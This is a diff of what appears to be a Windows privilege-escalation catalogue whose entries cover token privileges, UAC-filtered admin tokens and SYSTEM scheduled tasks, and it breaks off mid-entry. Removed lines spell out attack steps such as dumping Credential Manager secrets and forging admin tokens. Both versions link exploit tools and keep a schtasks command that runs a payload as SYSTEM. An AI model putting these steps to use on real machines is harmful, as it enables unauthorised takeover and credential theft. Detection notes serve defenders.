+            "label": "Microsoft — Perform volume maintenance tasks (archived policy reference)",
+            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft — Privileges",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges"
+          },
+          {
+            "label": "gtworek, PSBits FSCTL_SD_GLOBAL_CHANGE PoC",
+            "url": "https://github.com/gtworek/PSBits/blob/master/Misc/FSCTL_SD_GLOBAL_CHANGE.c"
+          }
+        ],
+        "requires": [
+          "SeManageVolumePrivilege",
+          "A SYSTEM process that loads a writable/missing DLL to trigger"
+        ],
+        "summary": "Understand the user right for volume-maintenance tasks.",
+        "tools": [
+          {
+            "name": "SeManageVolumeExploit",
+            "url": "https://github.com/CsEnox/SeManageVolumeExploit"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "The SeManageVolumePrivilege policy reference covers volume and disk maintenance, including creating or removing volumes and defragmentation.",
+          "section": "Microsoft — Perform volume maintenance tasks (archived policy reference) — Reference",
+          "sources": [
+            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks"
+          ]
+        },
+        {
+          "text": "Windows privileges apply to the local computer, and a domain account can have different privileges on different computers.",
+          "section": "Microsoft — Privileges — Local account database and access token scope",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'pe-setrustedcredman',
-    label: 'SeTrustedCredManAccess',
-    phase: 'hold',
-    summary: 'Back up and decrypt every Credential Manager secret.',
-    affects: 'All supported Windows versions if the privilege is held (Winlogon and LSASS by default; rarely delegated).',
-    description: r`SeTrustedCredManAccessPrivilege ("Access Credential Manager as a trusted caller") is held by Winlogon and LSASS by default. With it, enable the privilege, impersonate the Winlogon token, call CredBackupCredentials to export the user's Credential Manager store, then decrypt it with CryptUnprotectData, recovering saved passwords for escalation or lateral movement.`,
-    tools: [
-      { name: 'forkatz', url: 'https://github.com/Barbarisch/forkatz' },
-      { name: 'BackupCreds', url: 'https://github.com/leftp/BackupCreds' },
+    "id": "pe-setrustedcredman",
+    "label": "SeTrustedCredManAccess",
+    "phase": "hold",
+    "summary": "Understand Credential Manager's trusted-caller privilege.",
+    "affects": "All supported Windows versions if the privilege is held (Winlogon and LSASS by default; rarely delegated).",
+    "description": "SeTrustedCredManAccessPrivilege is the user right named Access Credential Manager as a trusted caller. Microsoft's archived policy reference associates this setting with Credential Manager backup and restoration. That reference recommends leaving the policy at its default. These statements describe the documented purpose and recommendation, without asserting a current account assignment.",
+    "tools": [
+      {
+        "name": "forkatz",
+        "url": "https://github.com/Barbarisch/forkatz"
+      },
+      {
+        "name": "BackupCreds",
+        "url": "https://github.com/leftp/BackupCreds"
+      }
     ],
-    mitre: mitre('T1555.004'),
-    references: [{ label: "Tyranid's Lair, Dumping Stored Credentials", url: 'https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html' }],
-    requires: ['SeTrustedCredManAccessPrivilege in the token', 'An elevated/local-admin context to borrow Winlogon\'s token (no unprivileged user holds this privilege directly)'],
-    opsec: 'Rarely granted outside Winlogon; CredBackupCredentials while impersonating Winlogon is an unusual, detectable call sequence.',
+    "mitre": {
+      "id": "T1555.004",
+      "url": "https://attack.mitre.org/techniques/T1555/004/"
+    },
+    "references": [
+      {
+        "label": "Microsoft — Access Credential Manager as a trusted caller (archived policy reference)",
+        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/access-credential-manager-as-a-trusted-caller",
+        "kind": "primary"
+      },
+      {
+        "label": "Tyranid's Lair, Dumping Stored Credentials",
+        "url": "https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html"
+      }
+    ],
+    "requires": [
+      "SeTrustedCredManAccessPrivilege in the token",
+      "An elevated/local-admin context to borrow Winlogon's token (no unprivileged user holds this privilege directly)"
+    ],
+    "opsec": "Rarely granted outside Winlogon; CredBackupCredentials while impersonating Winlogon is an unusual, detectable call sequence.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions if the privilege is held (Winlogon and LSASS by default; rarely delegated).",
+        "description": "SeTrustedCredManAccessPrivilege is the user right named Access Credential Manager as a trusted caller. Microsoft's archived policy reference associates this setting with Credential Manager backup and restoration. That reference recommends leaving the policy at its default. These statements describe the documented purpose and recommendation, without asserting a current account assignment.",
+        "id": "pe-setrustedcredman",
+        "label": "SeTrustedCredManAccess",
+        "mitre": {
+          "id": "T1555.004",
+          "url": "https://attack.mitre.org/techniques/T1555/004/"
+        },
+        "opsec": "Rarely granted outside Winlogon; CredBackupCredentials while impersonating Winlogon is an unusual, detectable call sequence.",
+        "phase": "hold",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft — Access Credential Manager as a trusted caller (archived policy reference)",
+            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/access-credential-manager-as-a-trusted-caller"
+          },
+          {
+            "label": "Tyranid's Lair, Dumping Stored Credentials",
+            "url": "https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html"
+          }
+        ],
+        "requires": [
+          "SeTrustedCredManAccessPrivilege in the token",
+          "An elevated/local-admin context to borrow Winlogon's token (no unprivileged user holds this privilege directly)"
+        ],
+        "summary": "Understand Credential Manager's trusted-caller privilege.",
+        "tools": [
+          {
+            "name": "forkatz",
+            "url": "https://github.com/Barbarisch/forkatz"
+          },
+          {
+            "name": "BackupCreds",
+            "url": "https://github.com/leftp/BackupCreds"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "The archived Microsoft policy reference associates SeTrustedCredManAccessPrivilege with Credential Manager backup and restoration.",
+          "section": "Microsoft — Access Credential Manager as a trusted caller (archived policy reference) — Reference",
+          "sources": [
+            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/access-credential-manager-as-a-trusted-caller"
+          ]
+        },
+        {
+          "text": "The archived Microsoft policy reference recommends leaving the trusted-caller policy at its default.",
+          "section": "Microsoft — Access Credential Manager as a trusted caller (archived policy reference) — Best practices",
+          "sources": [
+            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/access-credential-manager-as-a-trusted-caller"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'pe-secreatetoken',
-    label: 'SeCreateToken',
-    phase: 'hold',
-    summary: 'Call NtCreateToken to forge a token with a privileged group SID.',
-    affects: 'All supported Windows versions when the privilege is held (very rarely granted to a non-SYSTEM account).',
-    description: r`SeCreateTokenPrivilege lets you build a token by hand with NtCreateToken. You cannot simply mint a usable NT AUTHORITY\SYSTEM token from nothing (naive attempts fail), but you can forge an impersonation token for your own user with a high-privilege group SID added, typically the local Administrators SID, subject to the rule that the forged token's integrity is at or below your process. Impersonate that token to act as a local administrator, then take any Admin to SYSTEM path. Rarely granted, but a direct win where it is.`,
-    tools: [
-      { name: 'daem0nc0re / PrivFu (token-privilege PoCs)', url: 'https://github.com/daem0nc0re/PrivFu' },
-      { name: 'Priv2Admin', url: 'https://github.com/gtworek/Priv2Admin' },
+    "id": "pe-secreatetoken",
+    "label": "SeCreateToken",
+    "phase": "hold",
+    "summary": "Understand token creation as a Windows security operation.",
+    "affects": "All supported Windows versions when the privilege is held (very rarely granted to a non-SYSTEM account).",
+    "description": "SeCreateTokenPrivilege corresponds to the Create a token object user right. An access token describes the security context of a process or thread, including identity and privileges. The privilege associated with token creation and the security information represented by a token are separate concepts.",
+    "tools": [
+      {
+        "name": "daem0nc0re / PrivFu (token-privilege PoCs)",
+        "url": "https://github.com/daem0nc0re/PrivFu"
+      },
+      {
+        "name": "Priv2Admin",
+        "url": "https://github.com/gtworek/Priv2Admin"
+      }
     ],
-    commands: [
-      { label: 'Confirm the privilege', code: r`whoami /priv`, lang: 'cmd' },
-      { label: 'Forge an Administrators token, then impersonate it', code: r`:: build and run the SeCreateTokenPrivilegePoC from daem0nc0re/PrivFu`, lang: 'cmd' },
+    "commands": [
+      {
+        "label": "Confirm the privilege",
+        "code": "whoami /priv",
+        "lang": "cmd"
+      },
+      {
+        "label": "Forge an Administrators token, then impersonate it",
+        "code": ":: build and run the SeCreateTokenPrivilegePoC from daem0nc0re/PrivFu",
+        "lang": "cmd"
+      }
     ],
-    mitre: mitre('T1134.003'),
-    references: [
-      { label: 'Abusing Token Privileges for LPE (ExploitDB 42556)', url: 'https://www.exploit-db.com/papers/42556' },
-      { label: 'Priv2Admin, SeCreateTokenPrivilege', url: 'https://github.com/gtworek/Priv2Admin' },
+    "mitre": {
+      "id": "T1134.003",
+      "url": "https://attack.mitre.org/techniques/T1134/003/"
+    },
+    "references": [
+      {
+        "label": "Microsoft — Create a token object (archived policy reference)",
+        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/create-a-token-object",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft — Access Tokens",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
+        "kind": "primary"
+      },
+      {
+        "label": "Abusing Token Privileges for LPE (ExploitDB 42556)",
+        "url": "https://www.exploit-db.com/papers/42556"
+      },
+      {
+        "label": "Priv2Admin, SeCreateTokenPrivilege",
+        "url": "https://github.com/gtworek/Priv2Admin"
+      }
     ],
-    requires: ['SeCreateTokenPrivilege in the token'],
-    opsec: 'A process other than LSASS calling NtCreateToken, then impersonating a token carrying an added Administrators SID, is anomalous and detectable.',
+    "requires": [
+      "SeCreateTokenPrivilege in the token"
+    ],
+    "opsec": "A process other than LSASS calling NtCreateToken, then impersonating a token carrying an added Administrators SID, is anomalous and detectable.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions when the privilege is held (very rarely granted to a non-SYSTEM account).",
+        "commands": [
+          {
+            "code": "whoami /priv",
+            "label": "Confirm the privilege",
+            "lang": "cmd"
+          },
+          {
+            "code": ":: build and run the SeCreateTokenPrivilegePoC from daem0nc0re/PrivFu",
+            "label": "Forge an Administrators token, then impersonate it",
+            "lang": "cmd"
+          }
+        ],
+        "description": "SeCreateTokenPrivilege corresponds to the Create a token object user right. An access token describes the security context of a process or thread, including identity and privileges. The privilege associated with token creation and the security information represented by a token are separate concepts.",
+        "id": "pe-secreatetoken",
+        "label": "SeCreateToken",
+        "mitre": {
+          "id": "T1134.003",
+          "url": "https://attack.mitre.org/techniques/T1134/003/"
+        },
+        "opsec": "A process other than LSASS calling NtCreateToken, then impersonating a token carrying an added Administrators SID, is anomalous and detectable.",
+        "phase": "hold",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft — Create a token object (archived policy reference)",
+            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/create-a-token-object"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft — Access Tokens",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          },
+          {
+            "label": "Abusing Token Privileges for LPE (ExploitDB 42556)",
+            "url": "https://www.exploit-db.com/papers/42556"
+          },
+          {
+            "label": "Priv2Admin, SeCreateTokenPrivilege",
+            "url": "https://github.com/gtworek/Priv2Admin"
+          }
+        ],
+        "requires": [
+          "SeCreateTokenPrivilege in the token"
+        ],
+        "summary": "Understand token creation as a Windows security operation.",
+        "tools": [
+          {
+            "name": "daem0nc0re / PrivFu (token-privilege PoCs)",
+            "url": "https://github.com/daem0nc0re/PrivFu"
+          },
+          {
+            "name": "Priv2Admin",
+            "url": "https://github.com/gtworek/Priv2Admin"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "SeCreateTokenPrivilege corresponds to the Create a token object user right.",
+          "section": "Microsoft — Create a token object (archived policy reference) — Reference and constant name",
+          "sources": [
+            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/create-a-token-object"
+          ]
+        },
+        {
+          "text": "An access token describes the security context of a Windows process or thread.",
+          "section": "Microsoft — Access Tokens — Opening definition",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'pe-setcb',
-    label: 'SeTcb',
-    phase: 'hold',
-    summary: 'Act as part of the OS to craft a privileged token.',
-    affects: 'All supported Windows versions if the privilege is held (very rarely granted).',
-    description: r`SeTcbPrivilege lets a process act as part of the trusted computing base. Combined with the LSA logon APIs (LsaLogonUser), it can add arbitrary high-privilege SIDs to a token or obtain a SYSTEM-level token, escalating to full control.`,
-    tools: [{ name: 'gtworek PsBits (VirtualAccounts / TcbElevation)', url: 'https://github.com/gtworek/PSBits' }],
-    commands: [
-      { label: 'No off-the-shelf one-liner: requires custom code calling LsaLogonUser to make and impersonate a token', code: r`:: build and run a SeTcb LsaLogonUser PoC (gtworek PsBits)`, lang: 'cmd' },
+    "id": "pe-setcb",
+    "label": "SeTcb",
+    "phase": "hold",
+    "summary": "Understand the right associated with trusted authentication services.",
+    "affects": "All supported Windows versions if the privilege is held (very rarely granted).",
+    "description": "SeTcbPrivilege corresponds to Act as part of the operating system. Microsoft's archived policy reference describes low-level authentication services as the typical users of this right. A Windows access token represents user identity, groups and privileges separately; a privilege assignment should not be used as an account name.",
+    "tools": [
+      {
+        "name": "gtworek PsBits (VirtualAccounts / TcbElevation)",
+        "url": "https://github.com/gtworek/PSBits"
+      }
     ],
-    mitre: mitre('T1134.003'),
-    references: [{ label: 'Priv2Admin, Windows privilege abuse', url: 'https://github.com/gtworek/Priv2Admin' }],
-    requires: ['SeTcbPrivilege in the token'],
-    opsec: 'Rarely granted; abnormal LSA logon calls are detectable.',
+    "commands": [
+      {
+        "label": "No off-the-shelf one-liner: requires custom code calling LsaLogonUser to make and impersonate a token",
+        "code": ":: build and run a SeTcb LsaLogonUser PoC (gtworek PsBits)",
+        "lang": "cmd"
+      }
+    ],
+    "mitre": {
+      "id": "T1134.003",
+      "url": "https://attack.mitre.org/techniques/T1134/003/"
+    },
+    "references": [
+      {
+        "label": "Microsoft — Act as part of the operating system (archived policy reference)",
+        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft — Access Tokens",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
+        "kind": "primary"
+      },
+      {
+        "label": "Priv2Admin, Windows privilege abuse",
+        "url": "https://github.com/gtworek/Priv2Admin"
+      }
+    ],
+    "requires": [
+      "SeTcbPrivilege in the token"
+    ],
+    "opsec": "Rarely granted; abnormal LSA logon calls are detectable.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions if the privilege is held (very rarely granted).",
+        "commands": [
+          {
+            "code": ":: build and run a SeTcb LsaLogonUser PoC (gtworek PsBits)",
+            "label": "No off-the-shelf one-liner: requires custom code calling LsaLogonUser to make and impersonate a token",
+            "lang": "cmd"
+          }
+        ],
+        "description": "SeTcbPrivilege corresponds to Act as part of the operating system. Microsoft's archived policy reference describes low-level authentication services as the typical users of this right. A Windows access token represents user identity, groups and privileges separately; a privilege assignment should not be used as an account name.",
+        "id": "pe-setcb",
+        "label": "SeTcb",
+        "mitre": {
+          "id": "T1134.003",
+          "url": "https://attack.mitre.org/techniques/T1134/003/"
+        },
+        "opsec": "Rarely granted; abnormal LSA logon calls are detectable.",
+        "phase": "hold",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft — Act as part of the operating system (archived policy reference)",
+            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft — Access Tokens",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          },
+          {
+            "label": "Priv2Admin, Windows privilege abuse",
+            "url": "https://github.com/gtworek/Priv2Admin"
+          }
+        ],
+        "requires": [
+          "SeTcbPrivilege in the token"
+        ],
+        "summary": "Understand the right associated with trusted authentication services.",
+        "tools": [
+          {
+            "name": "gtworek PsBits (VirtualAccounts / TcbElevation)",
+            "url": "https://github.com/gtworek/PSBits"
+          }
+        ]
+      },
+      "claims": [
+        {
+          "text": "The archived Microsoft policy reference identifies low-level authentication services as the typical users of SeTcbPrivilege.",
+          "section": "Microsoft — Act as part of the operating system (archived policy reference) — Reference",
+          "sources": [
+            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system"
+          ]
+        },
+        {
+          "text": "A Windows access token records user identity, group membership and privileges as distinct information.",
+          "section": "Microsoft — Access Tokens — Access token contents",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
+          ]
+        }
+      ]
+    }
   },
   {
-    id: 'pe-serelabel',
-    label: 'SeRelabel',
-    phase: 'hold',
-    summary: 'Own a higher-integrity (SYSTEM) object → SYSTEM.',
-    affects: 'All supported Windows versions if held (almost never granted); needs a High-integrity context.',
-    description: r`SeRelabelPrivilege can modify an object's mandatory integrity label, letting you take ownership of objects at a HIGHER integrity level than your own, including SYSTEM processes. From a High-integrity context, take ownership of a SYSTEM process, grant yourself full control over it, and inject/parent-spoof into it to execute as NT AUTHORITY\SYSTEM. Stronger than SeTakeOwnership, but needs High integrity and is almost never granted to users.`,
-    mitre: mitre('T1134'),
-    references: [{ label: 'Decoder, Abusing the SeRelabelPrivilege', url: 'https://decoder.cloud/2024/05/30/abusing-the-serelabelprivilege/' }],
-    requires: ['SeRelabelPrivilege', 'High-integrity context'],
-    opsec: 'A serious misconfiguration if a standard user holds it; taking ownership of a SYSTEM process is a strong detection.',
+    "id": "pe-serelabel",
+    "label": "SeRelabel",
+    "phase": "hold",
+    "summary": "Understand mandatory integrity labels and their modification.",
+    "affects": "All supported Windows versions if held (almost never granted); needs a High-integrity context.",
+    "description": "SeRelabelPrivilege concerns modification of an object's integrity label. Mandatory Integrity Control is a Windows access-control mechanism that operates in addition to discretionary access-control lists. An integrity label and an object's discretionary permissions are separate security properties.",
+    "mitre": {
+      "id": "T1134",
+      "url": "https://attack.mitre.org/techniques/T1134/"
+    },
+    "references": [
+      {
+        "label": "Microsoft — Modify an object label (archived policy reference)",
+        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/modify-an-object-label",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft — Mandatory Integrity Control",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control",
+        "kind": "primary"
+      },
+      {
+        "label": "Decoder, Abusing the SeRelabelPrivilege",
+        "url": "https://decoder.cloud/2024/05/30/abusing-the-serelabelprivilege/"
+      }
+    ],
+    "requires": [
+      "SeRelabelPrivilege",
+      "High-integrity context"
+    ],
+    "opsec": "A serious misconfiguration if a standard user holds it; taking ownership of a SYSTEM process is a strong detection.",
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions if held (almost never granted); needs a High-integrity context.",
+        "description": "SeRelabelPrivilege concerns modification of an object's integrity label. Mandatory Integrity Control is a Windows access-control mechanism that operates in addition to discretionary access-control lists. An integrity label and an object's discretionary permissions are separate security properties.",
+        "id": "pe-serelabel",
+        "label": "SeRelabel",
+        "mitre": {
+          "id": "T1134",
+          "url": "https://attack.mitre.org/techniques/T1134/"
+        },
+        "opsec": "A serious misconfiguration if a standard user holds it; taking ownership of a SYSTEM process is a strong detection.",
+        "phase": "hold",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft — Modify an object label (archived policy reference)",
+            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/modify-an-object-label"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft — Mandatory Integrity Control",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control"
+          },
+          {
+            "label": "Decoder, Abusing the SeRelabelPrivilege",
+            "url": "https://decoder.cloud/2024/05/30/abusing-the-serelabelprivilege/"
+          }
+        ],
+        "requires": [
+          "SeRelabelPrivilege",
+          "High-integrity context"
+        ],
+        "summary": "Understand mandatory integrity labels and their modification."
+      },
+      "claims": [
+        {
+          "text": "SeRelabelPrivilege corresponds to modifying an object's integrity label.",
+          "section": "Microsoft — Modify an object label (archived policy reference) — Reference",
+          "sources": [
+            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/modify-an-object-label"
+          ]
+        },
+        {
+          "text": "Windows Mandatory Integrity Control provides access control in addition to discretionary access-control lists.",
+          "section": "Microsoft — Mandatory Integrity Control — Opening definition",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control"
+          ]
+        }
+      ]
+    }
   },
 
   // ── Local Group Membership (whoami /groups) ─────────────────────────────────
@@ -462,15 +2648,87 @@ Add-ADGroupMember -Identity "<Group>" -Members <you>`, lang: 'powershell' },
     affects: 'All supported Windows Server versions (Active Directory).',
   },
   {
-    id: 'pe-admins-filtered',
-    label: 'Administrators (Filtered Token)',
-    phase: 'hold',
-    summary: 'You are admin, but UAC filters the token.',
-    affects: 'All supported Windows versions with UAC enabled.',
-    description: r`whoami /groups shows the local Administrators SID, but it is "deny-only" and your token runs at Medium integrity because of UAC. You already have the rights; you just need to unfilter the token. A UAC bypass restores the high-integrity admin token, and from there any Admin → SYSTEM technique applies.`,
-    mitre: mitre('T1548.002'),
-    requires: ['Membership in local Administrators with a UAC-filtered token'],
-    opsec: 'No action by itself; it routes to the UAC-bypass / admin-to-SYSTEM techniques.',
+    "id": "pe-admins-filtered",
+    "label": "Administrators (Filtered Token)",
+    "phase": "hold",
+    "summary": "Understand deny-only group SIDs and the UAC token model.",
+    "affects": "All supported Windows versions with UAC enabled.",
+    "description": "A deny-only group SID participates in access-denied checks but does not grant access through access-allowed entries. Its presence in a token therefore does not confer that group's allowed permissions. In UAC Admin Approval Mode, an administrator's standard and administrative tokens are distinct; elevation uses the administrative token. Account membership and the current process token need to be described separately.",
+    "mitre": {
+      "id": "T1548.002",
+      "url": "https://attack.mitre.org/techniques/T1548/002/"
+    },
+    "requires": [
+      "Membership in local Administrators with a UAC-filtered token"
+    ],
+    "opsec": "No action by itself; it routes to the UAC-bypass / admin-to-SYSTEM techniques.",
+    "references": [
+      {
+        "label": "Microsoft, SID Attributes in an Access Token",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-attributes-in-an-access-token",
+        "section": "SE_GROUP_USE_FOR_DENY_ONLY",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, How User Account Control works",
+        "url": "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works",
+        "section": "Sign in process; The UAC user experience",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
+      "reviewedBy": "Codex",
+      "reviewerType": "ai",
+      "scope": "Selected conceptual claims in the identity, permissions, and audit-policy explanation. Excludes commands, tools, prerequisites, applicability, connection outcomes, route viability, and ATT&CK mappings. Navigation labels remain project conventions.",
+      "reviewedContent": {
+        "affects": "All supported Windows versions with UAC enabled.",
+        "description": "A deny-only group SID participates in access-denied checks but does not grant access through access-allowed entries. Its presence in a token therefore does not confer that group's allowed permissions. In UAC Admin Approval Mode, an administrator's standard and administrative tokens are distinct; elevation uses the administrative token. Account membership and the current process token need to be described separately.",
+        "id": "pe-admins-filtered",
+        "label": "Administrators (Filtered Token)",
+        "mitre": {
+          "id": "T1548.002",
+          "url": "https://attack.mitre.org/techniques/T1548/002/"
+        },
+        "opsec": "No action by itself; it routes to the UAC-bypass / admin-to-SYSTEM techniques.",
+        "phase": "hold",
+        "references": [
+          {
+            "kind": "primary",
+            "label": "Microsoft, SID Attributes in an Access Token",
+            "section": "SE_GROUP_USE_FOR_DENY_ONLY",
+            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-attributes-in-an-access-token"
+          },
+          {
+            "kind": "primary",
+            "label": "Microsoft, How User Account Control works",
+            "section": "Sign in process; The UAC user experience",
+            "url": "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
+          }
+        ],
+        "requires": [
+          "Membership in local Administrators with a UAC-filtered token"
+        ],
+        "summary": "Understand deny-only group SIDs and the UAC token model."
+      },
+      "claims": [
+        {
+          "text": "A deny-only SID is considered for access-denied entries and ignored for access-allowed entries.",
+          "section": "Microsoft, SID Attributes in an Access Token — SE_GROUP_USE_FOR_DENY_ONLY",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-attributes-in-an-access-token"
+          ]
+        },
+        {
+          "text": "The UAC model uses separate standard and administrative access tokens for an administrator in Admin Approval Mode.",
+          "section": "Microsoft, How User Account Control works — Sign in process; The UAC user experience",
+          "sources": [
+            "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works"
+          ]
+        }
+      ]
+    }
   },
 
   // ── UAC Bypass (medium → high integrity) ────────────────────────────────────
@@ -612,20 +2870,113 @@ reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecut
     opsec: 'Service creation (Event ID 7045) and PsExec named pipes are classic detections.',
   },
   {
-    id: 'pe-admin-schtask-system',
-    label: 'Scheduled Task as SYSTEM',
-    phase: 'admin',
-    summary: 'Register a task that runs as SYSTEM.',
-    affects: 'All supported Windows versions.',
-    description: r`As a high-integrity administrator, create a scheduled task whose principal is SYSTEM and run it immediately. schtasks /ru SYSTEM (or a task XML with the LocalSystem principal) executes your command as NT AUTHORITY\SYSTEM without installing a service.`,
-    tools: [{ name: 'schtasks (built-in)', url: 'https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks' }],
-    commands: [
-      { label: 'Create + run a SYSTEM task', code: r`schtasks /create /tn sysT /tr "C:\Temp\payload.exe" /sc once /st 00:00 /ru SYSTEM /f
-schtasks /run /tn sysT`, lang: 'cmd' },
+    "id": "pe-admin-schtask-system",
+    "label": "Scheduled Task as SYSTEM",
+    "phase": "admin",
+    "summary": "Understand LocalSystem as a scheduled task's execution identity.",
+    "affects": "All supported Windows versions.",
+    "description": "A scheduled task has a security context associated with an account or group. LocalSystem is one Windows account identity, with extensive privileges on the local computer, and is separate from a logged-on user's account. The task's configured identity describes its execution context; the Task Scheduler label alone does not identify that account.",
+    "tools": [
+      {
+        "name": "schtasks (built-in)",
+        "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks"
+      }
     ],
-    mitre: mitre('T1053.005'),
-    requires: ['High-integrity administrator context'],
-    opsec: 'Task creation (Event ID 4698) with a SYSTEM principal is a strong signal.',
+    "commands": [
+      {
+        "label": "Create + run a SYSTEM task",
+        "code": "schtasks /create /tn sysT /tr \"C:\\Temp\\payload.exe\" /sc once /st 00:00 /ru SYSTEM /f\nschtasks /run /tn sysT",
+        "lang": "cmd"
+      }
+    ],
+    "mitre": {
+      "id": "T1053.005",
+      "url": "https://attack.mitre.org/techniques/T1053/005/"
+    },
+    "requires": [
+      "High-integrity administrator context"
+    ],
+    "opsec": "Task creation (Event ID 4698) with a SYSTEM principal is a strong signal.",
+    "references": [
+      {
+        "label": "Microsoft, Security Contexts for Tasks",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks",
+        "section": "Opening context definition; Specifying Credentials; task permissions",
+        "kind": "primary"
+      },
+      {
+        "label": "Microsoft, LocalSystem Account",
+        "url": "https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account",
+        "section": "Opening account definition",
+        "kind": "primary"
+      }
+    ],
+    "review": {
+      "status": "source-reviewed",
+      "reviewedAt": "2026-09-07",
